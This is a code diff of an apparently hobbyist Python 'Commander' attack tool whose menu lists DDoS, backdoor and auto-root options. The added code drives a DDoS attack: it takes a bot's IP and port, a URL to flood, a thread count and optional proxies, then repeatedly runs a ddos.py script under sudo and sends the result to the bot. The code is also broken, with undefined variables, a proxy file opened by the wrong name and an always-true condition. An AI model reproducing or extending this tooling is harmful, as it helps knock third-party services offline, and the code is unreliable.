@@ -14,7 +14,7 @@ def show_banner(s):
     print('-----------------------------------------------------------------')
     time.sleep(1)
 def options():
-      table = [["Options","Severity"],["Ddos-attack(0)",5],["Backdoor(1)",5],["Auto-Root(2)",5]]
+      table = [["Options","Severity","Reference"],["Ddos-attack(0)",5,"https://en.wikipedia.org/wiki/Denial-of-service_attack"],["Backdoor(1)",5,"https://www.malwarebytes.com/backdoor"],["Auto-Root(2)",5,"https://www.lastline.com/labsblog/unmasking-kernel-exploits/"]]
       print(tabulate(table,headers='firstrow',tablefmt='grid'))
 
 def execute():
@@ -32,25 +32,41 @@ def execute():
     print(root_fmt,end='')
     choice = input("")
     if choice == "0":
-        ip = input("Server Ip: ")
-        port = int(input("Server Port: "))
-        while True:
-            s.connect((ip, port))
-            cmd = bytes(input("Input: "),'utf-8')
-            s.send(cmd)
-
+        ip = input("Bot Ip: ")
+        port = int(input("Bot Port: "))
+        global url_flood
+        url_flood = input("Url to flood: ")
+        global url_threads
+        url_threads = input("Number of threads: ")
+        url_proxy = input("Use Proxies(y/n): ").lower()
+        if url_proxy == "y":
+            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Proceeding with using proxies.")
+            open_proxy = open(url_proxy,'r')
+            read_proxy = open_proxy.readlines()
+            while True:
+                s.connect((ip, port))
+                for i in proxy_array:
+                    cmd = bytes(os.system(f"sudo python3 scripts/ddos.py -u {url_flood} -t {url_threads} -p {proxy_location}"),'utf-8')
+                    s.send(cmd)
+        elif url_proxy == "n":
+            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Not using any proxies.")
+            while True:
+                s.connect((ip, port))
+                cmd = bytes(os.system(f"sudo python3 scripts/ddos.py -u {url_flood} -t {url_threads}"),'utf-8')
+                s.send(cmd)
+        elif url_proxy != "y" or url_proxy != "n":
+            print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}]Invalid Option.")
     else:
         print(f'{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Invalid Option.')
 
 if __name__ == '__main__':
-    banner = show_banner('''
-______________________________________________________________
-  ____  
- / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| | ___ _ __ 
-| |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |/ _ \ '__|
-| |__| (_) | | | | | | | | | | | (_| | | | | (_| |  __/ |   
- \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|\___|_|   
-______________________________________________________________
+    banner = show_banner(''' 
+  ____                                         __
+ / ___|___  _ __ ___  _ __ __    __ _ _  _   __| | ___ _ _   _ __  _   _ _ 
+| |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |/ _ \ '__| | '_ \| | | |
+| |__| (_) | | | | | | | | | | | (_| | | | | (_| |  __/ |    | |_) | |_| |
+ \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|\___|_|  (_) .__/ \__, |
+                                                             |_|    |___/ 
         ''')
     options()
     execute()
